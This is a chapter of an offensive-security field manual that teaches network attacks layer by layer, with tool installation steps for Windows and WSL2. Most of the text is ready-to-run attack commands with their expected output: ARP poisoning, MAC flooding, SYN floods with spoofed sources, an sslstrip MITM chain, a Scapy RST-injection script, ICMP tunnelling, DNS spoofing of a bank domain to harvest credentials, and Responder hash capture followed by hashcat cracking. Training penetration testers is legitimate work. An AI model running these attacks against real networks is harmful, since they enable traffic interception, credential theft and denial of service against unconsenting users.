# Chapter 17 — Network Warfare: TCP/IP From The Attacker's Perspective

**VADER-RCE Field Manual**
**Prerequisite**: Basic networking concepts (IP addresses, ports, protocols)
**Drill**: DRILLS/17_network_warfare/

---

## Why You Need This

Every exploit you've built so far operates on a single machine. Local
privilege escalation. Local file parsing. Local memory corruption. That's
important — but it's half the picture.

The moment you touch a network, everything changes. You're not just
attacking ONE system's memory. You're attacking the PROTOCOL — the rules
that millions of machines agree to follow. Break the protocol and you
break the trust between systems. Man-in-the-middle a connection and
you see everything. Hijack a session and you become someone else.

Networking textbooks teach you how packets flow. This chapter teaches
you how to BREAK that flow — intercept it, redirect it, inject into it,
tunnel through it. Every layer of the network stack is an attack surface.
Every protocol assumption is a trust boundary.

You already know the crash-leak-execute chain for memory corruption.
Networks have their own chain: **enumerate-intercept-exploit**. Find what's
running. Get between it and its destination. Make it do what you want.

---

## WINDOWS SETUP

**This chapter was written assuming Linux. You are on Windows 11. Every
command in this chapter either runs in WSL2 (your Linux subsystem) or has
a native Windows alternative. Read this section first or you will spend
three hours wondering why nothing works.**

### Step 1 — Install WSL2

WSL2 gives you a full Ubuntu environment inside Windows. Most of the
offensive tools in this chapter only exist on Linux — WSL2 is how you run
them.

```powershell
# Run this in PowerShell AS ADMINISTRATOR
# Right-click PowerShell → "Run as administrator"
wsl --install
# This installs WSL2 + Ubuntu by default. Reboot required after.
```

After reboot, open Ubuntu from the Start menu. Set a username and password.
This is your Linux environment — remember the password, it's required for
`sudo`.

**Verification:**
```powershell
wsl --status
# Expected output: Default Distribution: Ubuntu, Default Version: 2
```

### Step 2 — Install Tools

All tools below. Some run natively on Windows, most require WSL2.
**Admin rights required for Nmap, Wireshark installer, and the WSL install.**

---

#### Nmap (runs natively on Windows)

```powershell
# Option A — winget (recommended, run in PowerShell)
winget install Insecure.Nmap

# Option B — manual download
# https://nmap.org/download.html → click "Latest stable release self-installer"
```

**Verification:**
```powershell
nmap --version
# Expected: Nmap 7.9x ( https://nmap.org )
```

> **Note:** On Windows, nmap SYN scans (`-sS`) require Npcap (installed
> automatically with Nmap). If Npcap isn't installed, SYN scans silently
> fall back to connect scans.

---

#### Wireshark (runs natively on Windows — packet capture GUI)

```powershell
winget install WiresharkFoundation.Wireshark
# OR download from https://www.wireshark.org/download.html
```

**Verification:**
```powershell
"C:\Program Files\Wireshark\tshark.exe" --version
# Expected: TShark (Wireshark) 4.x.x
```

> **Admin rights required** to capture live packets. Run Wireshark as
> administrator or add your user to the `Npcap Users` group via
> System Properties.

---

#### Python + Scapy (runs natively on Windows)

```powershell
# Install Scapy into your Python environment
pip install scapy
# Also install Npcap first (https://npcap.com/#download) — Scapy needs it for raw sockets
```

**Verification:**
```powershell
python -c "from scapy.all import IP, TCP; print('Scapy OK')"
# Expected: Scapy OK
# Failure: "No module named scapy" → run pip install scapy again
```

> **Admin rights required** at runtime. Run your terminal as administrator
> when using Scapy to send/receive raw packets. Without admin, `send()`
> will fail silently or throw a permission error.

---

#### hping3, arpspoof, ettercap, bettercap, aircrack-ng suite — WSL2 ONLY

These tools do not exist on Windows natively. Install inside WSL2 (Ubuntu):

```bash
# Run these inside your WSL2 Ubuntu terminal
sudo apt update && sudo apt upgrade -y

# Core offensive networking tools
sudo apt install -y \
    nmap \
    hping3 \
    dsniff \
    ettercap-text-only \
    arpspoof \
    responder \
    sslstrip \
    netcat-openbsd \
    dnsutils \
    snmp \
    aircrack-ng \
    aireplay-ng \
    airodump-ng \
    hashcat \
    iodine \
    ptunnel-ng \
    proxychains4 \
    gobuster \
    hydra \
    onesixtyone
```

**Verification (inside WSL2):**
```bash
hping3 --version
# Expected: hping version 3.a2 (...)

responder --version
# Expected: NBT-NS, LLMNR & MDNS Responder x.x.x

aircrack-ng --version
# Expected: Aircrack-ng x.x
```

---

#### Chisel (cross-platform binary — runs on both Windows and WSL2)

```powershell
# Download from GitHub releases — pick the Windows amd64 binary
# https://github.com/jpillora/chisel/releases/latest
# Download chisel_X.X.X_windows_amd64.gz, extract chisel.exe
```

**WSL2 version (for running on compromised Linux hosts):**
```bash
# Inside WSL2
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_$(uname -s | tr '[:upper:]' '[:lower:]')_amd64.gz
gunzip chisel_*.gz && chmod +x chisel_* && sudo mv chisel_* /usr/local/bin/chisel
chisel --version
# Expected: x.x.x (...)
```

---

#### Ligolo-ng (runs natively on Windows as the proxy/attacker side)

```powershell
# Download from https://github.com/nicocha30/ligolo-ng/releases
# Get ligolo-proxy_Windows_64bit.zip — extract, add to PATH
ligolo-proxy --version
# Expected: ligolo-ng vX.X.X
```

---

#### dnscat2 (requires Ruby — WSL2)

```bash
# Inside WSL2
sudo apt install -y ruby ruby-dev
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server && sudo gem install bundler && bundle install
```

---

### WSL2 vs Windows — Quick Reference

| Tool | Where it runs |
|------|---------------|
| nmap | Windows (native) OR WSL2 |
| Scapy | Windows (native, needs admin + Npcap) |
| Wireshark / tshark | Windows (native) |
| hping3 | WSL2 only |
| arpspoof / dsniff | WSL2 only |
| ettercap / bettercap | WSL2 only |
| Responder | WSL2 only |
| aircrack-ng / airodump-ng | WSL2 only (also needs USB WiFi adapter passthrough — see note below) |
| Chisel | Both |
| Ligolo-ng proxy | Windows (native) |
| proxychains | WSL2 only |
| hashcat | Windows (native — GPU support) OR WSL2 |

> **WiFi adapter note for WSL2:** To use aircrack-ng tools, you need a
> USB WiFi adapter passed through to WSL2. WSL2 cannot access the internal
> WiFi card directly. Use `usbipd-win` to attach a USB adapter:
> ```powershell
> winget install dorssel.usbipd-win
> usbipd list            # find your USB WiFi adapter
> usbipd attach --wsl --busid <BUSID>  # attach it to WSL2
> ```

---

## The OSI Model As A Kill Chain

Forget the textbook diagrams. Every layer of the OSI model is an attack
surface. When you look at the seven layers, you're looking at seven
different classes of attack.

### Layer 1 — Physical: The Wire Itself

The most overlooked attack surface because people think you need physical
access. You do — but physical access is easier to get than people assume.

**Attacks at Layer 1**:
- **Wiretapping**: Ethernet is electrical signals on copper. Tap the wire,
  read the signals. Fiber is harder (you need to bend it to leak light)
  but not impossible.
- **Rogue devices**: Drop a Raspberry Pi with a cellular modem on the
  network. Plug a WiFi Pineapple into an empty ethernet jack. Physical
  access for 30 seconds = persistent network access.
- **Jamming**: Wireless networks are radio. Flood the frequency and
  nothing gets through. Simple, brutal, effective for denial of service.

**Why it matters for you**: When you do physical penetration testing,
Layer 1 is how you establish a foothold. A $35 Pi Zero hidden behind
a printer gives you a pivot point into the internal network.

### Layer 2 — Data Link: MAC Addresses and Switches

This is where ARP lives. ARP is the protocol that maps IP addresses to
MAC addresses on a local network. It has ZERO authentication. Any device
can claim any MAC address. That's not a bug — it's how ARP was designed
in 1982 when networks were trusted.

**Attacks at Layer 2**:
- **ARP Spoofing/Poisoning**: Tell the victim "I'm the gateway" by
  broadcasting fake ARP replies. All their traffic routes through you.
  Classic MITM. Covered in detail below.
- **MAC Flooding**: Overwhelm a switch's CAM table with thousands of
  fake MAC addresses. When the table is full, the switch fails open —
  broadcasts everything to all ports like a hub. Now you can sniff all
  traffic on the segment.
- **VLAN Hopping**: If switch ports aren't properly configured, you can
  craft 802.1Q double-tagged frames to jump between VLANs. Send a frame
  tagged with the target VLAN nested inside a frame tagged with the
  native VLAN — the first switch strips the outer tag, the second switch
  routes based on the inner tag.
- **STP Manipulation**: The Spanning Tree Protocol prevents loops. Send
  forged BPDU packets claiming to be a root bridge with a lower priority.
  The network reconfigures itself to route traffic through you.

```bash
# Run inside WSL2

# MAC flood attack with macof (part of dsniff suite)
# -i eth0 = interface name (use "ip a" to find yours in WSL2 — often eth0)
# -n 100000 = send 100,000 fake MAC frames to overflow the switch CAM table
macof -i eth0 -n 100000

# ARP spoofing with arpspoof (bidirectional — must run BOTH commands)
# Tell victim (192.168.1.100) that you're the gateway (192.168.1.1)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
# Also tell the gateway that you're the victim (bidirectional)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

#### Expected Output

**macof success:**
```
e6:9a:1d:f3:... 10.0.0.x > 10.0.0.y: ...
(continuous stream of crafted frames scrolling past)
```

**arpspoof success:**
```
0:c:29:xx:xx:xx 0:c:29:yy:yy:yy 0806 42: arp reply 192.168.1.1 is-at 0:c:29:xx:xx:xx
(repeating every ~2 seconds)
```

**Failure looks like:** `arpspoof: couldn't arp for host 192.168.1.100` — means the target IP doesn't exist on the network or you're on the wrong interface. Run `ip a` inside WSL2 to check your interface name.

### Layer 3 — Network: IP Addresses and Routing

IP has no built-in authentication either. The source address in an IP
packet is whatever the sender writes in the header. You can forge it.

**Attacks at Layer 3**:
- **IP Spoofing**: Forge the source IP in packets you send. Used for
  amplification attacks (send a request with the victim's IP as source;
  the response goes to the victim). Also used to bypass IP-based access
  controls that trust specific source addresses.
- **ICMP Tunneling**: ICMP (ping) packets have a data payload field.
  Nobody filters ICMP data content. Encapsulate your real traffic inside
  ICMP echo requests/replies and it flows right through firewalls that
  block everything except ping.
- **ICMP Redirect**: Send a forged ICMP redirect message telling a host
  to use a different gateway for a specific destination. The host updates
  its routing table. Your machine is now the "better route."
- **Source Routing**: IP headers can specify the exact route a packet
  should take. Most modern routers drop source-routed packets, but legacy
  networks and misconfigured devices still honor them.

```bash
# Run inside WSL2

# ICMP tunneling with icmpsh (attacker side — listener)
# <attacker_ip> = your WSL2 IP, <victim_ip> = compromised host
python icmpsh_m.py <attacker_ip> <victim_ip>

# ICMP tunneling with ptunnel (encapsulates TCP in ICMP)
# Proxy side (on compromised host):
ptunnel -x secretpassword
# Client side (on attacker — your WSL2 box):
# -p = proxy (compromised host), -lp = local port to listen on
# -da = destination address to reach through tunnel, -dp = destination port
ptunnel -p <proxy_ip> -lp 8080 -da <target_ip> -dp 22 -x secretpassword
# Now SSH to localhost:8080 and it tunnels through ICMP to target:22
```

### Layer 4 — Transport: TCP and UDP

This is where most of the interesting offensive action happens. TCP's
reliability mechanisms — sequence numbers, acknowledgments, connection
state — create exploitable assumptions.

**Attacks at Layer 4**:
- **SYN Flood**: Send thousands of SYN packets with spoofed source IPs.
  The target allocates connection state for each one, waiting for the
  third step of the handshake that never comes. Connection table fills up.
  Legitimate connections can't get through.
- **TCP Hijacking**: If you can predict or observe TCP sequence numbers,
  you can inject packets into an existing connection. The receiving end
  accepts them because the sequence numbers are valid.
- **RST Injection**: Send a forged RST (reset) packet with valid sequence
  numbers to tear down someone else's connection. Used by the Great
  Firewall of China to kill connections to banned sites.
- **UDP Amplification**: Some UDP services respond with much more data
  than the request contained. DNS responds to a ~60-byte query with
  up to ~4000 bytes. NTP monlist responds to a 234-byte request with
  up to 100x the data. Spoof the source IP to the victim's address
  and amplify your bandwidth by 50-100x.

```bash
# Run inside WSL2

# SYN flood with hping3
# -S = SYN flag, --flood = send as fast as possible, -V = verbose, -p 80 = target port
hping3 -S --flood -V -p 80 <target_ip>

# SYN flood with spoofed source (randomizes source IP each packet)
hping3 -S --flood -V -p 80 --rand-source <target_ip>

# TCP RST injection (requires knowing current sequence number)
# Scapy example below in packet crafting section
```

#### Expected Output

**hping3 success:**
```
HPING <target_ip> (eth0 <target_ip>): S set, 40 headers + 0 data bytes
hping in flood mode, no replies will be shown
```
Press Ctrl+C to stop. It prints a packet count summary.

**Failure looks like:** `hping3: unable to open raw socket for device eth0` — means you're not running as root. Run `sudo hping3 ...`.

### Layer 5 — Session: Connection Management

Session layer attacks target the mechanisms that maintain state between
requests. HTTP is stateless, so applications bolt on session management
with cookies, tokens, and session IDs.

**Attacks at Layer 5**:
- **Session Hijacking**: Steal a session cookie and you ARE that user.
  The server can't tell the difference. XSS, network sniffing, or
  predictable session IDs all get you there.
- **Session Fixation**: Force the victim to use a session ID you already
  know. Set the cookie before they log in. When they authenticate, that
  known session ID is now authenticated.
- **SSL/TLS Session Attacks**: Renegotiation attacks, session resumption
  abuse, ticket key reuse.

### Layer 6 — Presentation: Data Formatting

This layer handles encryption, compression, and encoding. The attack
surface is the transition between encrypted and plaintext states.

**Attacks at Layer 6**:
- **SSL Stripping**: Downgrade an HTTPS connection to HTTP. The victim
  thinks they're secure (or doesn't notice the missing padlock). You
  see everything in plaintext. Tool: `sslstrip`.
- **Encoding Attacks**: Unicode normalization, double encoding, charset
  manipulation. These bypass input validation filters by encoding
  malicious characters in unexpected ways.

```bash
# Run inside WSL2 — ALL of these are Linux-only commands

# Full SSL strip MITM setup:

# 1. ARP spoof to get traffic flowing through you (run in background)
arpspoof -i eth0 -t <victim_ip> <gateway_ip> &
arpspoof -i eth0 -t <gateway_ip> <victim_ip> &

# 2. Enable IP forwarding so traffic actually passes through your box
#    (Linux /proc filesystem — WSL2 has this, Windows does NOT)
echo 1 > /proc/sys/net/ipv4/ip_forward

# 3. Redirect HTTP traffic to sslstrip using iptables (Linux firewall rules)
#    -t nat = NAT table, -A PREROUTING = before routing decision
#    --destination-port 80 = catch HTTP traffic, -j REDIRECT = redirect to...
#    --to-port 8080 = ...your sslstrip listener
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# 4. Run sslstrip — listens on 8080, strips HTTPS redirects, logs credentials
sslstrip -l 8080
```

#### Expected Output

**sslstrip success:**
```
sslstrip 0.9 by Moxie Marlinspike
[...]
2026-06-27 10:00:00,000 Redirecting GET http://bank.com/ ...
```

**Failure looks like:** `iptables: command not found` inside WSL2 — means your WSL2 distribution needs iptables: `sudo apt install iptables`. If `echo 1 > /proc/sys/net/ipv4/ip_forward` returns "permission denied", run with `sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'`.

> **Windows equivalent:** There is no direct Windows equivalent for iptables
> PREROUTING rules. This attack chain requires WSL2. The Windows Firewall
> (WF.msc) cannot do NAT redirects in the same way.

### Layer 7 — Application: Protocol-Specific Attacks

Every application protocol has its own attack surface. HTTP, DNS, SMB,
SMTP, FTP — each one has decades of vulnerabilities.

**Attacks at Layer 7**:
- **DNS Poisoning**: Inject false DNS records so domains resolve to your
  IP. Victim types `bank.com`, their DNS cache says that's `10.0.0.5`
  (your server). You serve a perfect clone. Credentials harvested.
- **SMB Relay**: Capture an NTLM authentication attempt and relay it to
  another server in real time. You never crack the hash — you just
  forward the authentication and ride the session.
- **HTTP Request Smuggling**: Exploit differences in how front-end and
  back-end servers parse HTTP headers (Content-Length vs Transfer-Encoding)
  to inject requests into other users' connections.
- **SMTP Spoofing**: Email protocols have no built-in sender verification
  (SPF/DKIM/DMARC are bolted-on fixes). Forge the From header and send
  emails as anyone.

---

## TCP/IP Internals For Exploitation

### The Three-Way Handshake — Why It Matters

Every TCP connection starts the same way:

```
Client  → SYN (seq=X)           → Server
Client  ← SYN-ACK (seq=Y, ack=X+1) ← Server
Client  → ACK (seq=X+1, ack=Y+1) → Server
```

**X** is the client's Initial Sequence Number (ISN). **Y** is the server's
ISN. After this exchange, both sides know each other's sequence numbers
and the connection is ESTABLISHED.

**Why you care**:
1. **Port scanning depends on this**. A SYN scan sends the first packet
   and watches the response. SYN-ACK = port open. RST = port closed.
   No response = filtered (firewall dropping packets).
2. **Sequence number prediction** is what makes TCP hijacking possible.
   If you can predict or observe Y (the server's ISN), you can inject
   packets that the server accepts as legitimate.
3. **The half-open state** (SYN received, SYN-ACK sent, waiting for ACK)
   consumes server resources. That's why SYN floods work — you leave
   thousands of connections in this half-open state.

### TCP Sequence Numbers — The Trust Mechanism

TCP uses sequence numbers to ensure ordered, reliable delivery. Each
byte of data has a sequence number. The receiver uses acknowledgment
numbers to confirm receipt.

**Historical vulnerability**: Early TCP implementations used predictable
ISN generation (simple counters or time-based increments). If you could
predict the ISN, you could blind-inject packets into a connection without
even seeing the server's responses. Modern OSes use cryptographic random
ISN generation (RFC 6528), but the principle matters:

```
# Old-style ISN: increment by 128,000 every second, 64,000 per connection
# If current ISN = 1,000,000 and you initiate at time T:
#   Next ISN ≈ 1,000,000 + (elapsed_ms * 128) + (connections * 64000)
# Predictable enough to exploit

# Modern ISN: hash(src_ip, dst_ip, src_port, dst_port, secret_key, time)
# Unpredictable without the secret key
```

**What you CAN still do**:
- If you're on the same network (MITM position), you can OBSERVE the
  actual sequence numbers and inject with precision.
- TCP window probing lets you infer information about connection state
  even without being in the path.

### RST Injection

If you know the current sequence number of a connection, you can kill it:

```python
# Scapy — RST injection to kill a TCP connection
# Run this in Python on Windows (as administrator) or inside WSL2
from scapy.all import *

# You need: src_ip, dst_ip, src_port, dst_port, and a valid seq number
# The seq must be within the receiver's TCP window

# Build IP layer — src= spoofs the source address (makes it look like other side sent RST)
ip = IP(src="10.0.0.50", dst="10.0.0.100")

# Build TCP RST — flags="R" sets the RST bit, seq= must match observed sequence
tcp = TCP(sport=12345, dport=80, flags="R", seq=<observed_seq_number>)

# Stack layers with / and transmit
send(ip/tcp)
```

The receiver gets a packet that looks like it came from the other end
of the connection saying "RESET." Connection torn down. The Great Firewall
does this to every connection containing forbidden keywords — it races
the real packets and delivers the RST first.

### TCP Window Manipulation

The TCP window field tells the sender how much data the receiver can
accept. Manipulating this lets you:
- **Slow connections to a crawl**: Advertise a tiny window (1 byte).
  The sender sends 1 byte at a time. Connection technically alive but
  useless. This is the Slowloris principle applied at the TCP level.
- **Probe connections**: Send a packet with a specific window size
  and observe how the target responds. The response reveals connection
  state information.

---

## Reconnaissance Techniques

### Port Scanning With Nmap

Nmap is the standard. Every scan type exploits a different aspect of
TCP/IP behavior. **Nmap runs natively on Windows** — open PowerShell or
cmd and use `nmap` directly. No WSL2 needed.

```bash
# These commands work in PowerShell/cmd (native Windows) OR WSL2
# Replace "sudo" with running your terminal as Administrator on Windows

# SYN scan (default, requires admin/root) — half-open, fast, stealthy
# Sends SYN, reads response, never completes handshake
# SYN-ACK = open, RST = closed, no response = filtered
# Windows: run PowerShell as Administrator, then: nmap -sS <target>
sudo nmap -sS <target>

# TCP connect scan (no root needed) — full handshake
# Completes the three-way handshake on each port
# More reliable but LOUDER — shows up in connection logs
nmap -sT <target>

# UDP scan — slow as hell but necessary
# Sends empty UDP packets (or protocol-specific payloads)
# ICMP port-unreachable = closed, no response = open|filtered
sudo nmap -sU <target>

# XMAS scan — sets FIN, PSH, URG flags simultaneously
# RFC 793 says: if port closed, send RST. If open, drop silently.
# Only works against RFC-compliant stacks (not Windows targets)
sudo nmap -sX <target>

# NULL scan — no flags set at all
# Same logic as XMAS — RST = closed, silence = open|filtered
sudo nmap -sN <target>

# FIN scan — only FIN flag set
# Same logic again. Useful for sneaking past stateless firewalls
# that only filter SYN packets
sudo nmap -sF <target>

# ACK scan — doesn't find open ports, finds FIREWALL RULES
# If RST comes back = unfiltered (firewall lets it through)
# If nothing comes back = filtered (firewall dropped it)
sudo nmap -sA <target>

# Version detection — probe open ports for service info
nmap -sV <target>

# OS fingerprinting — analyze TCP/IP stack behavior
# TTL values, window sizes, TCP options, DF bit, etc.
sudo nmap -O <target>

# Aggressive scan — OS detection + version + scripts + traceroute
sudo nmap -A <target>

# Scan specific ports
nmap -p 80,443,8080 <target>
nmap -p 1-1024 <target>        # first 1024 ports
nmap -p- <target>               # all 65535 ports (slow but thorough)

# Speed control — T0 (paranoid) to T5 (insane)
nmap -T4 <target>    # fast and reasonably quiet
nmap -T1 <target>    # slow, evades basic IDS

# Output formats
nmap -oN scan.txt <target>     # normal text
nmap -oX scan.xml <target>     # XML (for parsing)
nmap -oG scan.grep <target>    # grepable format
nmap -oA scan_all <target>     # all three formats
```

#### Expected Output

**nmap -sT success:**
```
Starting Nmap 7.9x ( https://nmap.org )
Nmap scan report for 192.168.1.1
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
443/tcp open  https
Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds
```

**Failure looks like:** `Note: Host seems down.` — target isn't up or is blocking ICMP. Add `-Pn` to skip host discovery: `nmap -sT -Pn <target>`.

**Failure looks like:** `You requested a scan type which requires root privileges.` — on Windows, run PowerShell as Administrator. On WSL2, add `sudo`.

### Service Enumeration and Banner Grabbing

Once you know what ports are open, figure out what's RUNNING on them:

```bash
# Nmap service version detection (aggressive)
# --version-intensity 5 = try harder to fingerprint the service (0-9 scale)
nmap -sV --version-intensity 5 <target>

# Manual banner grab with netcat (WSL2)
nc -nv <target> 80
# Then type:
# HEAD / HTTP/1.1
# Host: target.com
# (two blank lines)

# Banner grab with curl (works natively on Windows — curl is built into PowerShell)
curl -I http://<target>

# Grab SSH banner (WSL2 or Windows PowerShell with OpenSSH)
nc -nv <target> 22

# Grab SMTP banner
nc -nv <target> 25
```

> **Windows note:** `curl` is available natively in PowerShell on Windows 10/11.
> `nc` (netcat) is NOT native on Windows — use WSL2 for nc commands, or
> install `ncat` from the Nmap package (it's included when you install Nmap).
> Ncat on Windows: `ncat <target> <port>` from PowerShell.

#### Expected Output

**curl -I success:**
```
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Date: Fri, 27 Jun 2026 10:00:00 GMT
Content-Type: text/html; charset=UTF-8
```

**Failure looks like:** `curl: (7) Failed to connect to <target> port 80: Connection refused` — port is closed. Try a different port, or confirm the target is up with `nmap -Pn <target>`.

### DNS Enumeration

DNS is a goldmine. Subdomains reveal internal services, development
environments, admin panels — things that shouldn't be public-facing.

```bash
# Run inside WSL2 (or use Windows PowerShell equivalents noted below)

# Zone transfer attempt (AXFR)
# If the DNS server allows zone transfers, you get EVERY record
# "dig" is in WSL2 via dnsutils. Windows alternative: nslookup -type=AXFR <domain> <dns_server>
dig axfr @<dns_server> <domain>
# Most servers block this, but you'd be surprised how many don't

# Subdomain brute force with gobuster (WSL2)
# -d = target domain, -w = wordlist path (SecLists, installed separately)
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Install SecLists in WSL2 if not present:
# sudo apt install seclists  OR  git clone https://github.com/danielmiessler/SecLists /usr/share/seclists

# Reverse DNS lookup on an IP range (WSL2 bash loop)
# Find what hostnames point to IPs in a range
for ip in $(seq 1 254); do
    host 10.0.0.$ip | grep "name pointer"
done

# DNS record types to query (dig in WSL2 / nslookup in PowerShell)
dig <domain> A      # IPv4 address
dig <domain> AAAA   # IPv6 address
dig <domain> MX     # Mail servers
dig <domain> NS     # Name servers
dig <domain> TXT    # Text records (often SPF, DKIM, verification tokens)
dig <domain> CNAME  # Aliases
dig <domain> SOA    # Start of Authority
dig <domain> ANY    # Request all records (many servers refuse this now)

# Windows PowerShell equivalents (no WSL2 needed):
# Resolve-DnsName -Name <domain> -Type A
# Resolve-DnsName -Name <domain> -Type MX
# nslookup -type=TXT <domain>
```

#### Expected Output

**dig axfr success (rare but devastating):**
```
; <<>> DiG 9.x <<>> axfr @ns1.target.com target.com
target.com.     3600 IN SOA ns1.target.com. ...
target.com.     3600 IN A   1.2.3.4
dev.target.com. 3600 IN A   10.0.0.5
admin.target.com. 3600 IN A 10.0.0.6
...
```

**Failure looks like:** `Transfer failed.` — zone transfers are blocked (normal). Move to brute force with gobuster.

### SNMP Walking

SNMP (Simple Network Management Protocol) versions 1 and 2c use
"community strings" as passwords — and the default is literally "public."

```bash
# Run inside WSL2

# SNMP walk — dump everything the device will tell you
# -v 2c = SNMPv2c (most common), -c public = community string "public"
snmpwalk -v 2c -c public <target>

# Common OIDs to query:
# 1.3.6.1.2.1.1.1.0 — System description
# 1.3.6.1.2.1.1.5.0 — System name
# 1.3.6.1.2.1.25.4.2.1.2 — Running processes
# 1.3.6.1.2.1.25.6.3.1.2 — Installed software
# 1.3.6.1.4.1.77.1.2.25 — Windows user accounts

# Enumerate community strings with onesixtyone
# -c = community string wordlist, second arg = target
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>

# Brute force SNMP with hydra
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target> snmp
```

#### Expected Output

**snmpwalk success:**
```
SNMPv2-MIB::sysDescr.0 = STRING: Windows Server 2019 Datacenter Version ...
SNMPv2-MIB::sysName.0 = STRING: DC01
HOST-RESOURCES-MIB::hrSWRunName.1 = STRING: "System Idle Process"
...
```

**Failure looks like:** `Timeout: No Response from <target>` — SNMP is blocked, disabled, or you have the wrong community string. Try "private" as the community string, or run `onesixtyone` to brute force it.

---

## Man-in-the-Middle Attacks

MITM is the crown jewel of network warfare. Get between two systems
and you control the conversation. You can read it, modify it, redirect
it, or drop it entirely.

### ARP Cache Poisoning — The Classic

ARP maps IP addresses to MAC addresses on a local network. It's
completely unauthenticated. Any device can send an ARP reply saying
"IP 10.0.0.1 is at MAC aa:bb:cc:dd:ee:ff" and every device on the
segment UPDATES ITS CACHE without question.

**How it works**:

```
Normal state:
  Victim ARP cache:  Gateway 10.0.0.1 → MAC 00:11:22:33:44:55 (real)
  Gateway ARP cache: Victim 10.0.0.100 → MAC aa:bb:cc:dd:ee:ff (real)

After poisoning:
  Victim ARP cache:  Gateway 10.0.0.1 → MAC <YOUR_MAC> (fake)
  Gateway ARP cache: Victim 10.0.0.100 → MAC <YOUR_MAC> (fake)

Now ALL traffic between victim and gateway flows through you.
```

**Execution** (WSL2):

```bash
# Run inside WSL2

# Step 1: Enable IP forwarding so traffic actually passes through (not dropped)
# Linux /proc filesystem — this only works in WSL2, NOT native Windows
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'

# Step 2: Poison with arpspoof (bidirectional — run BOTH in separate terminals)
# & puts it in background so you can run the second command
arpspoof -i eth0 -t <victim_ip> <gateway_ip> &
arpspoof -i eth0 -t <gateway_ip> <victim_ip> &

# Or use ettercap (combines ARP spoofing + sniffing in one tool)
# -T = text mode, -M arp:remote = MITM via ARP, // = all hosts on both sides
ettercap -T -M arp:remote /<victim_ip>// /<gateway_ip>//

# Or use bettercap (modern, scriptable — install: sudo apt install bettercap)
# -iface = network interface
bettercap -iface eth0
# In bettercap console (interactive):
net.probe on                        # discover hosts
set arp.spoof.targets <victim_ip>   # target the victim
arp.spoof on                        # start poisoning
net.sniff on                        # start capturing traffic
```

#### Expected Output

**arpspoof success:**
```
0:c:29:xx:xx:xx 0:c:29:yy:yy:yy 0806 42: arp reply 192.168.1.1 is-at 0:c:29:xx:xx:xx
0:c:29:xx:xx:xx 0:c:29:zz:zz:zz 0806 42: arp reply 192.168.1.100 is-at 0:c:29:xx:xx:xx
(repeating — one line per poisoned ARP reply)
```

**ettercap success:**
```
Starting Unified sniffing...
ARP poisoning victims:
 GROUP 1 : 192.168.1.100 ...
 GROUP 2 : 192.168.1.1 ...
```

**Failure looks like:** `arpspoof: couldn't arp for host` — wrong IP or wrong interface. Run `ip a` to check your interface. Run `sudo arp-scan -l` (install with `sudo apt install arp-scan`) to confirm the victim is on the network.

### DNS Spoofing

Once you're in a MITM position, you can intercept DNS queries and
respond with forged answers before the real DNS server does.

```bash
# Run inside WSL2 (after ARP poisoning is active)

# With bettercap (in bettercap console after arp.spoof is on):
# Route all bank.com DNS queries to your IP
set dns.spoof.domains bank.com,login.bank.com
set dns.spoof.address <your_ip>   # your WSL2 IP address
dns.spoof on

# Now when the victim resolves bank.com, they get YOUR IP.
# Serve a phishing page on your server and harvest credentials.

# With dnschef (standalone DNS proxy — install: sudo apt install dnschef):
# --fakeip = IP to serve for spoofed domains
# --fakedomains = domains to intercept
# -i = interface to listen on
dnschef --fakeip <your_ip> --fakedomains bank.com -i <your_ip>
```

#### Expected Output

**bettercap dns.spoof success:**
```
[dns.spoof] bank.com -> 192.168.1.50 (spoofed)
```

**Failure looks like:** DNS spoof not working even though bettercap shows the intercept — victim's DNS cache may still have the real record. Wait for cache TTL to expire, or use `ipconfig /flushdns` on the victim's Windows machine.

### LLMNR / NBT-NS Poisoning With Responder

This is the bread and butter of internal Windows network pentesting.
When a Windows machine can't resolve a hostname via DNS, it falls back
to broadcast protocols:
1. **LLMNR** (Link-Local Multicast Name Resolution)
2. **NBT-NS** (NetBIOS Name Service)

These are BROADCAST queries — every machine on the subnet hears them.
Responder answers these broadcasts and says "Yeah, that's me." The
victim sends its NTLM authentication hash to your machine.

```bash
# Run inside WSL2

# Run Responder — listens for LLMNR/NBT-NS broadcasts on eth0
# -I eth0 = interface, -w = enable WPAD rogue proxy, -r = answer NBT-NS wredir, -f = fingerprint
sudo responder -I eth0 -wrf

# What happens:
# 1. User types \\fileserverr (typo) in Windows Explorer
# 2. DNS can't resolve "fileserverr" — no such hostname
# 3. Machine broadcasts LLMNR/NBT-NS query: "Anyone know fileserverr?"
# 4. Responder answers: "That's me! Authenticate here."
# 5. Victim sends NTLMv2 hash to Responder
# 6. Responder logs the hash

# Captured hashes look like:
# [SMB] NTLMv2-SSP Hash : domain\user::domain:challenge:response:blob
# Crack with hashcat (run on Windows for GPU acceleration — faster than WSL2):
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
# -m 5600 = NTLMv2 hash mode
```

#### Expected Output

**Responder running (waiting for victims):**
```
[*] [NBT-NS] Poisoned answer sent to 192.168.1.100 for name FILESERVERR
[SMB] NTLMv2-SSP Client   : 192.168.1.100
[SMB] NTLMv2-SSP Username : DOMAIN\jsmith
[SMB] NTLMv2-SSP Hash     : jsmith::DOMAIN:aabbccdd...:...
```

**hashcat success:**
```
Status.........: Cracked
Hash.Name......: NetNTLMv2
Guess.Base.....: File (rockyou.txt)
...
jsmith::DOMAIN:...:Password123
```

**Failure looks like:** Responder starts but captures nothing — you need to be on the same Layer 2 broadcast domain as the victim (same switch/VLAN). Also check Windows Firewall on your WSL2 host isn't blocking inbound SMB.

**Why this is devastating**: It requires zero exploitation. No buffer
overflow. No malware. Just a machine answering a broadcast question
that nobody else answered first. And it catches EVERYONE who mistypes
a hostname or references a server that no longer exists.

